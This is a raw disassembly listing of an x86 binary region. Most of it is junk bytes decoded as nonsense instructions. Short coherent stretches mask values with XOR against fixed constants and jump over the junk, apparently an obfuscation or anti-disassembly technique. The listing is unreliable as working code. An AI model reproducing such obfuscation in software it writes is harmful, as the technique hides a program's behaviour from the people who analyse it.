  407ba7:	mov    DWORD PTR [eax+0x6876120d],edi
  407bad:	hlt    
  407bae:	xchg   BYTE PTR [esi],ch
  407bb0:	(bad)  
  407bb1:	call   0x70709de7
  407bb6:	pop    ss
  407bb7:	adc    eax,0x2d3d038d
  407bbc:	dec    ecx
  407bbd:	fs or  edi,0x7e
  407bc1:	jmp    0xa133:0x1c605743
  407bc8:	loope  0x407bf6
  407bca:	mov    bl,0xd0
  407bcc:	daa    
  407bcd:	jae    0x407b62
  407bcf:	das    
  407bd0:	xchg   edi,eax
  407bd1:	jge    0x407c1b
  407bd3:	sti    
  407bd4:	inc    ebx
  407bd5:	xor    DWORD PTR [eax],ecx
  407bd7:	aas    
  407bd8:	scas   al,BYTE PTR es:[edi]
  407bd9:	sub    BYTE PTR [ebp-0x236e5a07],al
  407bdf:	lds    esp,FWORD PTR ds:0x2065d7fb
  407be5:	dec    ebp
  407be6:	aad    0x7c
  407be8:	jmp    0x407ba4
  407bea:	out    0xb5,al
  407bec:	clc    
  407bed:	jle    0x407c1e
  407bef:	push   eax
  407bf0:	or     bh,ch
  407bf2:	mov    bl,0x48
  407bf5:	repz (bad)
  407bf8:	cs (bad) 
  407bfa:	cli    
  407bfb:	divps  xmm4,xmm5
  407bfe:	loopne 0x407c57
  407c00:	nop
  407c01:	cmp    eax,0x67109076
  407c06:	and    bl,bl
  407c08:	popa   
  407c09:	ret    
  407c0a:	ret    
  407c0b:	or     ch,BYTE PTR [ebx+0x1]
  407c0e:	scas   al,BYTE PTR es:[edi]
  407c0f:	jb     0x407c44
  407c11:	push   edi
  407c12:	cmc    
  407c13:	push   es
  407c14:	jl     0x407bd8
  407c16:	sub    al,0x82
  407c18:	shr    DWORD PTR [esi+0x25],cl
  407c1b:	xchg   edi,eax
  407c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c1d:	inc    ebp
  407c1e:	cmp    eax,0xb5ccdeb3
  407c23:	mov    ah,0x1b
  407c25:	stc    
  407c26:	inc    esi
  407c27:	(bad)  
  407c28:	xor    BYTE PTR [ebp-0x3654131c],0xa6
  407c2f:	aas    
  407c30:	out    dx,al
  407c31:	cmp    DWORD PTR ds:[eax],esp
  407c34:	add    bh,dh
  407c36:	cmp    bl,ch
  407c38:	in     al,0xd1
  407c3a:	out    dx,eax
  407c3b:	sub    bh,ah
  407c3d:	jmp    0x407c46
  407c3f:	cmp    eax,0x8b08307c
  407c44:	inc    ebp
  407c45:	in     al,0xf
  407c47:	scas   eax,DWORD PTR es:[edi]
  407c48:	shr    DWORD PTR [ebx],0xe0
  407c4b:	mov    DWORD PTR [ebp-0x24],esp
  407c4e:	jmp    0x407dd7
  407c53:	dec    esi
  407c54:	cli    
  407c55:	sbb    al,0xe
  407c57:	test   al,0xda
  407c59:	outs   dx,BYTE PTR ds:[esi]
  407c5a:	jp     0x407c98
  407c5c:	out    0x6d,eax
  407c5e:	sar    BYTE PTR [esi+0x33e03113],1
  407c64:	es jl  0x407ce3
  407c67:	call   0xe0bcf8eb
  407c6c:	das    
  407c6d:	pop    ss
  407c6e:	(bad)  
  407c6f:	lea    edi,[edi-0x30]
  407c72:	rol    BYTE PTR [ebx],1
  407c74:	add    esp,ecx
  407c76:	push   cs
  407c77:	mov    ecx,0xdf352ec6
  407c7c:	in     al,0x60
  407c7e:	jg     0x407cd5
  407c80:	cmp    ebx,DWORD PTR [ebx+edi*1+0x11]
  407c84:	stos   BYTE PTR es:[edi],al
  407c85:	sub    DWORD PTR [ebp-0x57],ebp
  407c88:	int3   
  407c89:	mov    ?,ebx
  407c8b:	mov    ch,0x23
  407c8d:	sub    BYTE PTR [esi],dh
  407c8f:	xchg   ecx,eax
  407c90:	or     dl,cl
  407c92:	or     DWORD PTR [ebx-0x40],ebx
  407c95:	cld    
  407c96:	jmp    0x29a001c2
  407c9b:	jns    0x407caa
  407c9d:	dec    edx
  407c9e:	add    DWORD PTR [edx],esp
  407ca0:	bound  esi,QWORD PTR [esi]
  407ca2:	xchg   ecx,eax
  407ca3:	add    eax,0x6334219
  407ca8:	push   esi
  407ca9:	or     esp,DWORD PTR ss:[edx+eax*1-0x53763122]
  407cb1:	ins    BYTE PTR es:[edi],dx
  407cb2:	fcmovnbe st,st(6)
  407cb5:	push   ds
  407cb6:	add    eax,0xebcb4dd9
  407cbb:	and    BYTE PTR [edx],dh
  407cbd:	or     ecx,ebp
  407cbf:	xor    eax,0x3794f103
  407cc4:	scas   eax,DWORD PTR es:[edi]
  407cc5:	add    eax,0x8a343e11
  407cca:	or     al,0xd1
  407ccc:	cmp    al,0xd3
  407cce:	or     BYTE PTR [edi+eiz*2],al
  407cd1:	or     ch,BYTE PTR [esi-0x55]
  407cd4:	dec    edx
  407cd5:	jmp    0xe5d4:0x42db52c9
  407cdc:	outs   dx,BYTE PTR ds:[esi]
  407cdd:	adc    al,0xcf
  407cdf:	outs   dx,DWORD PTR ds:[esi]
  407ce0:	hlt    
  407ce1:	dec    esp
  407ce2:	jne    0x407cc3
  407ce4:	xlat   BYTE PTR ds:[ebx]
  407ce5:	sbb    al,0x93
  407ce7:	cwde   
  407ce8:	repz jb 0x407ca7
  407ceb:	or     edi,DWORD PTR [esi-0x2dc07424]
  407cf1:	inc    esp
  407cf2:	nop
  407cf3:	call   0xdf67:0xa4360b27
  407cfa:	sub    edi,esp
  407cfc:	shr    DWORD PTR [ecx+0x56c96eae],cl
  407d02:	jno    0x407d7c
  407d04:	push   0xa
  407d06:	ror    BYTE PTR [ecx],0x6
  407d09:	in     eax,dx
  407d0a:	pop    edi
  407d0b:	sub    al,0x61
  407d0d:	jb     0x407d4c
  407d0f:	xor    DWORD PTR ds:0xef53bbcf,esp
  407d15:	pop    esi
  407d16:	cmp    ebp,DWORD PTR [ebp+0x2d]
  407d19:	faddp  st(3),st
  407d1b:	mov    ch,0xc6
  407d1d:	sahf   
  407d1e:	mov    bl,0x3d
  407d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d21:	adc    ecx,DWORD PTR [edi+0x52a5b951]
  407d27:	mov    ds:0x6b320288,eax
  407d2c:	pop    esp
  407d2d:	and    al,0x7b
  407d2f:	aam    0x7b
  407d31:	and    DWORD PTR [esi+0x19],ebp
  407d34:	xchg   ebx,eax
  407d35:	call   0xb2abddd7
  407d3a:	push   ss
  407d3b:	inc    edx
  407d3c:	and    eax,0xb4772327
  407d41:	adc    al,0x91
  407d43:	push   ds
  407d44:	clc    
  407d45:	sub    ah,BYTE PTR [edi]
  407d47:	ret    0x8fd8
  407d4a:	das    
  407d4b:	push   cs
  407d4c:	sub    DWORD PTR [edi+0x2566a1fc],0x52
  407d53:	test   DWORD PTR [eax+0x1e],eax
  407d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d57:	popa   
  407d58:	xchg   ebx,eax
  407d59:	mov    ds:0xee0c460e,al
  407d5e:	push   ebx
  407d5f:	in     al,0x18
  407d61:	inc    ecx
  407d62:	push   ebp
  407d63:	and    eax,0x158b4de4
  407d68:	outs   dx,BYTE PTR ds:[esi]
  407d69:	adc    ch,BYTE PTR [ecx]
  407d6b:	pushf  
  407d6c:	sub    edx,DWORD PTR [edi-0x51]
  407d6f:	jne    0x407d1e
  407d71:	pop    ecx
  407d72:	inc    esi
  407d73:	dec    edi
  407d74:	lods   eax,DWORD PTR ds:[esi]
  407d75:	sbb    al,0xa5
  407d77:	test   eax,ecx
  407d79:	aam    0x4a
  407d7b:	inc    edx
  407d7c:	xor    esp,DWORD PTR [edi]
  407d7e:	inc    eax
  407d7f:	xor    bh,al
  407d81:	sub    dh,BYTE PTR [edx-0x5bba4087]
  407d87:	aaa    
  407d88:	inc    ecx
  407d89:	outs   dx,BYTE PTR ds:[esi]
  407d8a:	cmp    BYTE PTR ds:0x91f902c7,0x97
  407d91:	into   
  407d92:	mul    dh
  407d94:	dec    edx
  407d95:	shr    DWORD PTR [edx-0x3d],0x45
  407d99:	stos   DWORD PTR es:[edi],eax
  407d9a:	ja     0x407d81
  407d9c:	jae    0x407dc6
  407d9e:	mov    es,WORD PTR [edi+0x35a8d126]
  407da4:	lds    ebp,FWORD PTR [ebx-0x237a9bad]
  407daa:	dec    edi
  407dab:	ret    
  407dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dad:	xor    eax,0xf23483dd
  407db2:	aas    
  407db3:	mov    ah,0x1c
  407db5:	adc    dl,BYTE PTR [edi-0x412965d6]
  407dbb:	(bad)  
  407dbc:	call   FWORD PTR [ecx]
  407dbe:	add    DWORD PTR [ecx-0x324d107f],0x41
  407dc5:	(bad)  
  407dc6:	les    esi,FWORD PTR [ebx]
  407dc8:	outs   dx,BYTE PTR ds:[esi]
  407dc9:	adc    BYTE PTR [ecx+edi*1],bl
  407dcc:	push   ss
  407dcd:	ret    
  407dce:	test   eax,0xd13b7b9a
  407dd3:	xchg   ecx,eax
  407dd4:	mov    ecx,edi
  407dd6:	and    ecx,DWORD PTR [ebx+0x57b9fc45]
  407ddc:	or     BYTE PTR [ecx+0x7],dl
  407ddf:	xor    eax,ecx
  407de1:	mov    edx,0x32729e
  407de6:	add    eax,edx
  407de8:	jmp    0x407f71
  407ded:	push   0xffffffd5
  407def:	mov    ebp,0x7d64bd94
  407df4:	aad    0x16
  407df6:	sbb    bl,BYTE PTR [esi+0x70e5048e]
  407dfc:	sub    DWORD PTR [edi-0x178383c7],ebp
  407e02:	jg     0x407e80
  407e04:	jl     0x407e6b
  407e06:	cdq    
  407e07:	aaa    
  407e08:	dec    edx
  407e09:	pop    es
  407e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e0b:	mov    WORD PTR [ecx-0x4f32ebbf],gs
  407e11:	add    ebx,DWORD PTR [esi+0x57b687f2]
  407e17:	mov    BYTE PTR [ebx-0x2f],bh
  407e1a:	jb     0x407e7a
  407e1c:	add    cl,BYTE PTR [ebx-0x693ebe71]
  407e22:	push   ss
  407e23:	jnp    0x407df8
  407e25:	out    dx,eax
  407e26:	int    0x81
  407e28:	inc    eax
  407e29:	popf   
  407e2a:	add    BYTE PTR ds:0x3ca0c814,0x2d
  407e31:	cmp    al,0x7d
  407e33:	lods   al,BYTE PTR ds:[esi]
  407e34:	retf   0xa961
  407e37:	or     esp,ebp
  407e39:	cmc    
  407e3a:	je     0x407e1d
  407e3c:	fst    QWORD PTR [ecx-0x2e2e1b35]
  407e42:	add    BYTE PTR [edi-0x6f43804],al
  407e48:	dec    esp
  407e49:	sub    esp,edx
  407e4b:	sub    eax,0x5cca7e6c
  407e50:	and    DWORD PTR [ecx+0x3b],eax
  407e53:	add    BYTE PTR ds:0xd49a97dd,dh
  407e59:	je     0x407dee
  407e5b:	jns    0x407e00
  407e5d:	nop
  407e5e:	xlat   BYTE PTR ds:[ebx]
  407e5f:	jg     0x407e96
  407e61:	sbb    bl,BYTE PTR [ecx-0x52a11bcd]
  407e67:	dec    edx
  407e68:	push   edx
  407e69:	pop    edx
  407e6a:	push   ebp
  407e6b:	rol    DWORD PTR [eax+edx*8+0x608acc96],1
  407e72:	dec    eax
  407e73:	imul   eax,DWORD PTR [ecx],0x2bb46d96
  407e79:	ds push eax
  407e7b:	data16 loope 0x407ebe
  407e7e:	cdq    
  407e7f:	(bad)  
  407e80:	xchg   esi,eax
  407e81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e82:	xor    esp,edx
  407e84:	out    dx,al
  407e85:	inc    ebx
  407e86:	fwait
  407e87:	xchg   BYTE PTR [ecx-0x66],dh
  407e8a:	dec    esi
  407e8b:	(bad)  
  407e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e8d:	loopne 0x407efd
  407e8f:	ja     0x407ebf
  407e91:	or     BYTE PTR [edx],dh
  407e93:	pop    ecx
  407e94:	les    eax,FWORD PTR [ecx+0xe]
  407e97:	mov    ds:0xbb7a4351,al
  407e9c:	bound  ebp,QWORD PTR [eax]
  407e9e:	sub    cl,BYTE PTR [ebp+0x4f735f88]
  407ea4:	in     al,0xf
  407ea6:	ins    BYTE PTR es:[edi],dx
  407ea7:	mov    al,ds:0x393f6170
  407eac:	dec    ebx
  407ead:	or     ch,BYTE PTR [esi-0x5e93ae57]
  407eb3:	imul   edx,DWORD PTR [ebx-0x41],0xffffffa2
  407eb7:	stos   BYTE PTR es:[edi],al
  407eb8:	mov    ebx,0xae939959
  407ebd:	pop    ds
  407ebe:	pop    esp
  407ebf:	sysret 
  407ec1:	dec    ebp
  407ec2:	popf   
  407ec3:	fiadd  WORD PTR [eax+0x6e]
  407ec6:	outs   dx,BYTE PTR ds:[esi]
  407ec7:	lock add eax,0x1e701c8
  407ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ece:	xor    dl,BYTE PTR [ecx+0x452a3d7]
  407ed4:	outs   dx,BYTE PTR ds:[esi]
  407ed5:	cmp    al,0xe1
  407ed7:	push   edi
  407ed8:	jnp    0x407f52
  407eda:	js     0x407ed8
  407edc:	dec    ebx
  407edd:	sub    eax,0x72f77df
  407ee2:	xchg   ebp,eax
  407ee3:	arpl   WORD PTR [eax+ebx*4],bx
  407ee6:	pop    ebx
  407ee7:	leave  
  407ee8:	cwde   
  407ee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eea:	aam    0xc0
  407eec:	inc    esi
  407eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eee:	jg     0x407e8f
  407ef0:	push   0x1d
  407ef2:	fisubr WORD PTR [edi+0x6c6d3150]
  407ef8:	aad    0x67
  407efa:	sbb    edx,DWORD PTR [eax+eiz*2+0x1c]
  407efe:	inc    ebp
  407eff:	icebp  
  407f00:	out    dx,al
  407f01:	les    ecx,FWORD PTR ds:[eax-0x18]
  407f05:	mov    ch,0xd9
  407f07:	rol    BYTE PTR [ebp+0x75883721],cl
  407f0d:	mov    eax,ds:0x99b3cd1b
  407f12:	jne    0x407f2f
  407f14:	cs xor al,0xd8
  407f17:	int    0x8d
  407f19:	and    cl,0xf2
  407f1c:	int    0x59
  407f1e:	push   edx
  407f1f:	cmovl  esp,DWORD PTR [edx+ebx*4]
  407f23:	js     0x407f37
  407f25:	mov    bl,0xd3
  407f27:	mov    bl,0x5d
  407f29:	jp     0x407f7b
  407f2b:	hlt    
  407f2c:	pop    ebx
  407f2d:	xchg   esp,eax
  407f2e:	div    DWORD PTR [esi-0x42]
  407f31:	call   0x17c92bac
  407f36:	xchg   ebx,eax
  407f37:	xor    ecx,DWORD PTR ds:0xa10a51fb
  407f3d:	sbb    esi,DWORD PTR [ecx+0x4f320bbe]
  407f43:	mov    al,ds:0x53eb0dd7
  407f48:	inc    ecx
  407f49:	xlat   BYTE PTR ds:[ebx]
  407f4a:	add    BYTE PTR [ebp+0x2d],al
  407f4d:	ret    0x288c
  407f50:	ss test eax,0xfe6e8db6
  407f56:	arpl   WORD PTR ss:[edi],bp
  407f59:	dec    edi
  407f5a:	push   esp
  407f5b:	fadd   DWORD PTR [esi-0x37]
  407f5e:	ret    
  407f5f:	pop    esp
  407f60:	retf   
  407f61:	cmc    
  407f62:	cmp    esp,DWORD PTR [edi+0x5e]
  407f65:	inc    ebp
  407f66:	mov    ecx,0xdc2b9e41
  407f6b:	mov    ebx,0x2a1a78d8
  407f70:	(bad)  
  407f71:	mov    DWORD PTR [ebp+0x8],eax
  407f74:	mov    eax,DWORD PTR [ebp-0x18]
  407f77:	xor    eax,ecx
  407f79:	add    eax,edx
  407f7b:	mov    edx,DWORD PTR [ebp+0x14]
  407f7e:	imul   eax,DWORD PTR [edx]
  407f81:	mov    edx,DWORD PTR [ebp-0x4]
  407f84:	xor    edx,ecx
  407f86:	mov    ecx,DWORD PTR [ebp+0x8]
  407f89:	lea    ecx,[edx+ecx*1+0x32729e]
  407f90:	cmp    ecx,eax
  407f92:	je     0x4087b6
  407f98:	mov    edi,DWORD PTR [ebp-0x18]
  407f9b:	mov    eax,DWORD PTR [ebp+0x8]
  407f9e:	mov    edx,DWORD PTR [ebp+0x14]
  407fa1:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  407fa5:	mov    ecx,0x7510857
  407faa:	xor    edx,edx
  407fac:	xor    edi,ecx
  407fae:	mov    esi,0x32729e
  407fb3:	add    edi,esi
  407fb5:	jmp    0x40813e
  407fba:	je     0x40800f
  407fbc:	jne    0x407fa1
  407fbe:	ins    DWORD PTR es:[edi],dx
  407fbf:	gs out 0x7b,al
  407fc2:	aam    0xcc
  407fc4:	pop    es
  407fc5:	addr16 xchg esp,eax
  407fc7:	xchg   bl,bl
  407fc9:	into   
  407fca:	sbb    edi,DWORD PTR [ebx]
  407fcc:	jl     0x40804a
  407fce:	call   0x59bcfc52
  407fd3:	sub    ebp,DWORD PTR [edi-0x15abea8b]
  407fd9:	jnp    0x408052
  407fdb:	sbb    BYTE PTR [edx+0x3a74ff7b],al
  407fe1:	xor    DWORD PTR [ebp+edx*1+0x53],edx
  407fe5:	call   0x538a:0xee0f0d61
  407fec:	test   ch,ah
  407fee:	pop    eax
  407fef:	aad    0xac
  407ff1:	dec    edx
  407ff2:	mov    WORD PTR [ebp+ebx*2+0x29f84b2a],cs
  407ff9:	jmp    0x1883:0xfa2b10b3
  408000:	push   ss
  408001:	jo     0x40800a
  408003:	or     al,0x5f
  408005:	enter  0x4656,0xba
  408009:	push   edx
  40800a:	mov    eax,ds:0xe744151a
  40800f:	inc    esp
  408010:	stos   DWORD PTR es:[edi],eax
  408011:	shr    DWORD PTR [ebx-0x32be2008],0x63
  408018:	mov    edx,0xeeaaba34
  40801d:	cli    
  40801e:	aaa    
  40801f:	(bad)  
  408020:	clc    
  408021:	lods   eax,DWORD PTR ds:[esi]
  408022:	pushf  
  408023:	pop    esp
  408024:	mov    bl,cl
  408026:	out    0x3e,eax
  408028:	jmp    0xbc50:0x8ea865f5
  40802f:	js     0x407ff0
  408031:	aam    0x76
  408033:	adc    DWORD PTR [ecx],0xffffff8f
  408036:	imul   ebp,DWORD PTR [ebp+0x74eff123],0xffffffe0
  40803d:	pusha  
  40803e:	sbb    DWORD PTR [edi+ebp*2-0x214eab6e],edx
  408045:	xlat   BYTE PTR ds:[ebx]
  408046:	pushf  
  408047:	or     BYTE PTR [edi+edx*8],dl
  40804a:	mov    ecx,0xa7d043f6
  40804f:	fistp  DWORD PTR [edx+0x2034b360]
  408055:	xchg   ebx,eax
  408056:	xor    eax,DWORD PTR [ebp-0x20cb530d]
  40805c:	ret    0x13ea
  40805f:	out    0xeb,al
  408061:	inc    ebp
  408062:	in     al,0x1c
  408064:	mov    bl,0xfa
  408066:	jnp    0x40801e
  408068:	mov    cl,BYTE PTR [ecx]
  40806a:	loope  0x408085
  40806c:	into   
  40806d:	arpl   WORD PTR ds:0xa2f147b5,ax
  408073:	gs dec eax
  408075:	or     edx,esi
  408077:	cmc    
  408078:	pop    edx
  408079:	call   0xb502:0x5ae8801b
  408080:	ror    BYTE PTR [esi-0x38965443],0x3f
  408087:	imul   ebx,DWORD PTR [esi],0x49
  40808a:	jmp    0x408012
  40808c:	repnz mov al,0xf6
  40808f:	adc    eax,0x130005f2
  408094:	sub    al,0x94
  408096:	and    al,0x47
  408098:	fwait
  408099:	iret   
  40809a:	icebp  
  40809b:	cmp    BYTE PTR [edx],ch
  40809d:	push   edx
  40809e:	inc    esi
  40809f:	int3   
  4080a0:	push   ss
  4080a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080a2:	pop    ds
  4080a3:	imul   edi,DWORD PTR [ebx+0x21],0xc97ac329
  4080aa:	loopne 0x40802c
  4080ac:	mov    cl,0x11
  4080ae:	jmp    0x4080cb
  4080b0:	xor    DWORD PTR [eax],edx
  4080b2:	mov    ah,BYTE PTR [ebp-0x738ff964]
  4080b8:	inc    esp
  4080b9:	loope  0x4080c3
  4080bb:	inc    ecx
  4080bc:	dec    edi
  4080bd:	mov    esp,0x10b5c8c1
  4080c2:	fwait
  4080c3:	push   esp
  4080c4:	out    dx,al
  4080c5:	jno    0x4080f6
  4080c7:	sub    BYTE PTR [edi],ah
  4080c9:	call   0x196f:0xf1fde0b1
  4080d0:	fstp   QWORD PTR [eax-0x53]
  4080d3:	dec    esp
  4080d4:	cmp    eax,0xa81a6a25
  4080d9:	xchg   esi,eax
  4080da:	shl    ah,1
  4080dc:	push   0xb20a574e
  4080e1:	jae    0x4080cd
  4080e3:	test   al,0x71
  4080e5:	sbb    eax,0x5c20648d
  4080ea:	ss xor edi,esi
  4080ed:	push   esp
  4080ee:	push   0xffffffcd
  4080f0:	aam    0x29
  4080f2:	or     BYTE PTR [edx+0x1a],cl
  4080f5:	push   esi
  4080f6:	in     al,0x5c
  4080f8:	and    BYTE PTR [ecx-0x4883aba8],dh
  4080fe:	dec    edi
  4080ff:	fcomp  QWORD PTR [edi]
  408101:	jno    0x408097
  408103:	scas   eax,DWORD PTR es:[edi]
  408104:	adc    ch,BYTE PTR [ecx+0x32c851ed]
  40810a:	mov    edx,0x994c8648
  40810f:	xchg   DWORD PTR [ebp+0x70],edi
  408112:	xchg   ah,cl
  408114:	jns    0x4080ce
  408116:	jnp    0x4080db
  408118:	cmp    DWORD PTR [edx+eiz*1],edx
  40811b:	fmulp  st(6),st
  40811d:	fs mov esp,0x214bf02c
  408123:	add    al,0x49
  408125:	loope  0x40818a
  408127:	jns    0x408142
  408129:	mov    ecx,0x8aa4fb2a
  40812e:	rcl    DWORD PTR [esi],cl
  408130:	inc    eax
  408131:	pop    esi
  408132:	sub    eax,0xdfcaefa
  408137:	iret   
  408138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408139:	rol    cl,cl
  40813b:	cs jmp 0xfc55:0x8bf7f760
  408143:	xor    edx,ecx
  408145:	lea    eax,[edx+eax*1+0x32729e]
  40814c:	mov    edx,DWORD PTR [ebp+0x8]
  40814f:	mov    edi,DWORD PTR [ebp-0x24]
  408152:	mov    DWORD PTR [edi+edx*4],eax
  408155:	mov    eax,DWORD PTR [ebp-0x18]
  408158:	mov    edx,DWORD PTR [ebp+0x8]
  40815b:	xor    eax,ecx
  40815d:	lea    eax,[eax+edx*1+0x32729e]
  408164:	mov    DWORD PTR [ebp+0x8],eax
  408167:	mov    eax,DWORD PTR [ebp-0x18]
  40816a:	jmp    0x4082f3
  40816f:	sahf   
  408170:	mov    eax,0x7dfa3de4
  408175:	push   ebp
  408176:	mov    ebx,0x5d2a391f
  40817b:	repnz cmp DWORD PTR [ecx+0x7c3af767],eax
  408182:	jl     0x40816c
  408184:	jg     0x408202
  408186:	jl     0x4081bd
  408188:	dec    ebx
  408189:	lock leave 
  40818b:	jbe    0x4081e8
  40818d:	jne    0x40813f
  40818f:	pushw  0x6345
  408193:	pop    edi
  408194:	push   es
  408195:	inc    edi
  408196:	sbb    dl,ch
  408198:	sub    bh,BYTE PTR [esi+0x7c]
  40819b:	mov    WORD PTR [edi],fs
  40819d:	(bad)  
  40819e:	sbb    cl,bl
  4081a0:	or     BYTE PTR [esi+ebx*8+0x1c],dh
  4081a4:	mov    eax,edi
  4081a6:	mov    edi,0xdd1ca371
  4081ab:	pmulhuw mm5,mm1
  4081ae:	shl    BYTE PTR [esi+0x64bfb9c4],cl
  4081b4:	andps  xmm5,XMMWORD PTR [ebp+0x43f1c4cf]
  4081bb:	mov    ds:0xd0171d83,eax
  4081c0:	jo     0x408218
  4081c2:	out    dx,eax
  4081c3:	sbb    edx,DWORD PTR [eax-0x26]
  4081c6:	xchg   ebp,eax
  4081c7:	push   eax
  4081c8:	mov    al,0xa8
  4081ca:	mov    edx,0xa9014fcc
  4081cf:	cmp    cl,BYTE PTR ds:0xd1b2d0ec
  4081d5:	dec    ax
  4081d7:	dec    ebx
  4081d8:	inc    eax
  4081d9:	xlat   BYTE PTR ds:[ebx]
  4081da:	adc    ebx,esi
  4081dc:	mov    al,0xde
  4081de:	fist   WORD PTR [ecx+esi*2]
  4081e1:	es cld 
  4081e3:	xchg   edi,eax
  4081e4:	push   0x2d
  4081e6:	dec    esp
  4081e7:	ins    BYTE PTR es:[edi],dx
  4081e8:	sub    edx,DWORD PTR [eax-0x28a1ace8]
  4081ee:	mov    al,0x66
  4081f0:	mov    ds:0x2cff49b,al
  4081f5:	mov    ah,0xac
  4081f7:	inc    ebp
  4081f8:	loope  0x40822d
  4081fa:	neg    BYTE PTR [ebx-0x71]
  4081fd:	mov    bh,0x18
  4081ff:	xchg   BYTE PTR [ecx+0x11],bl
  408202:	shl    BYTE PTR [edx+ebx*8-0x1f75fae2],cl
  408209:	and    ecx,ebx
  40820b:	fist   DWORD PTR [eax+0x55]
  40820e:	mov    cl,0xd1
  408210:	(bad)  
  408211:	mov    es,WORD PTR [esi]
  408213:	xchg   ebx,eax
  408214:	sub    eax,0x96b46111
  408219:	nop
  40821a:	and    al,0x28
  40821c:	mov    esp,0x1616128b
  408221:	stc    
  408222:	ss or  eax,0x99c6f53
  408228:	or     al,0x1b
  40822a:	out    0x88,eax
  40822c:	pushf  
  40822d:	mov    ah,0x94
  40822f:	bound  ebx,QWORD PTR [eax]
  408231:	add    BYTE PTR [esi+0x3796f951],bl
  408237:	loopne 0x4081e2
  408239:	add    DWORD PTR [edi-0x3c075685],0x24
  408240:	push   ecx
  408241:	or     esp,edx
  408243:	call   0xc7ea:0x7833f519
  40824a:	fidivr WORD PTR ds:0xdcf960c1
  408250:	xchg   eax,edx
  408252:	sub    esi,DWORD PTR [edi-0x2736269e]
  408258:	adc    BYTE PTR [ebx],cl
  40825a:	xchg   edx,eax
  40825b:	cmp    eax,0x14219b76
  408260:	dec    edx
  408261:	test   eax,0x6b35586f
  408266:	xor    al,0x2b
  408268:	push   0x77
  40826a:	stos   DWORD PTR es:[edi],eax
  40826b:	mov    WORD PTR [ecx-0x32],?
  40826e:	mov    eax,0xcc9c4691
  408273:	ds ret 
  408275:	dec    edi
  408276:	es push ss
  408278:	out    dx,eax
  408279:	jne    0x4082f4
  40827b:	pop    esp
  40827c:	adc    eax,0xf1eb412d
  408281:	pop    edx
  408282:	add    bl,bl
  408284:	and    bh,BYTE PTR [edi-0x6247aeaf]
  40828a:	iret   
  40828b:	push   0xa997e291
  408290:	inc    ecx
  408291:	pop    es
  408292:	fnstenv [ebx+0x3d5d0607]
  408298:	push   ss
  408299:	jae    0x4082b7
  40829b:	or     dl,al
  40829d:	icebp  
  40829e:	pop    ebx
  40829f:	xor    eax,0xf4bb18f9
  4082a4:	fadd   DWORD PTR [edi-0x5e33f56]
  4082aa:	shl    DWORD PTR [edx+0x3b],1
  4082ad:	stc    
  4082ae:	jno    0x408239
  4082b0:	out    0x27,al
  4082b2:	push   0x8ec5eb69
  4082b7:	cmp    dh,bl
  4082b9:	lods   al,BYTE PTR ds:[esi]
  4082ba:	js     0x4082c7
  4082bc:	mov    WORD PTR [ebx+0x27],es
  4082bf:	cmp    al,0xe5
  4082c1:	pop    edi
  4082c2:	xor    esi,esp
  4082c4:	(bad)  [ebp+0x6b]
  4082c7:	icebp  
  4082c8:	xchg   ebp,eax
  4082c9:	xchg   BYTE PTR [edx-0x60e41160],bl
  4082cf:	mov    eax,0xd514fc56
  4082d4:	and    eax,DWORD PTR [ecx+0x58]
  4082d7:	into   
  4082d8:	loopne 0x408296
  4082da:	fwait
  4082db:	in     al,dx
  4082dc:	xlat   BYTE PTR ds:[ebx]
  4082dd:	xchg   BYTE PTR [esi],bl
  4082df:	les    eax,FWORD PTR [esi]
  4082e1:	stos   DWORD PTR es:[edi],eax
  4082e2:	(bad)  
  4082e3:	sub    esi,ebx
  4082e5:	adc    al,BYTE PTR [esi-0x2b]
  4082e8:	in     eax,dx
  4082e9:	cmp    al,BYTE PTR [ecx+0x563c193b]
  4082ef:	mov    ch,0xf1
  4082f1:	sar    BYTE PTR [ecx],0x8b
  4082f4:	push   ebp
  4082f5:	adc    al,0xe9
  4082f7:	test   BYTE PTR [ecx],al
  4082f9:	add    BYTE PTR [eax],al
  4082fb:	ret    0xc507
  4082fe:	out    0xdd,eax
  408300:	std    
  408301:	cli    
  408302:	cmp    eax,0xbb29729
  408307:	in     eax,dx
  408308:	adc    cl,BYTE PTR ds:0x7c3d63e0
  40830e:	jl     0x4082f8
  408310:	jg     0x40838e
  408312:	jl     0x40829f
  408314:	mov    BYTE PTR [esi+0x18],bh
  408317:	mov    ah,0xaf
  408319:	or     DWORD PTR [edi],ebx
  40831b:	icebp  
  40831c:	test   ecx,esi
  40831e:	and    dh,BYTE PTR [ecx]
  408320:	dec    edi
  408321:	ds es push esp
  408324:	mov    edi,0xa2347ac
  408329:	push   ebp
  40832b:	mul    BYTE PTR [ecx]
  40832d:	lahf   
  40832e:	sar    BYTE PTR [edi],cl
  408330:	daa    
  408331:	sub    edi,DWORD PTR [eax+0x40]
  408334:	jg     0x408391
  408336:	xchg   DWORD PTR [edi],esi
  408338:	xchg   BYTE PTR [esi-0x5bf1777c],dl
  40833e:	sub    bh,BYTE PTR [edx-0x20]
  408341:	sbb    esp,DWORD PTR [esi]
  408343:	mov    bl,0x9f
  408345:	(bad)  [edx]
  408347:	idiv   BYTE PTR [ecx+0xb4b84fe]
  40834d:	ins    BYTE PTR es:[edi],dx
  40834e:	aam    0x1b
  408350:	aad    0x9a
  408352:	sub    edi,esi
  408354:	add    al,0x16
  408356:	or     eax,0x9c8a258b
  40835b:	mov    eax,0x9c6c72f4
  408360:	ret    0x23c1
  408363:	dec    eax
  408364:	add    eax,0x156fb66f
  408369:	lock fwait
  40836b:	(bad)  
  40836c:	xor    BYTE PTR [esi],ch
  40836e:	xor    DWORD PTR [ecx+0x32fbe82],edx
  408374:	mov    DWORD PTR [ebp-0xc38bb99],0x868e8082
  40837e:	int    0xaf
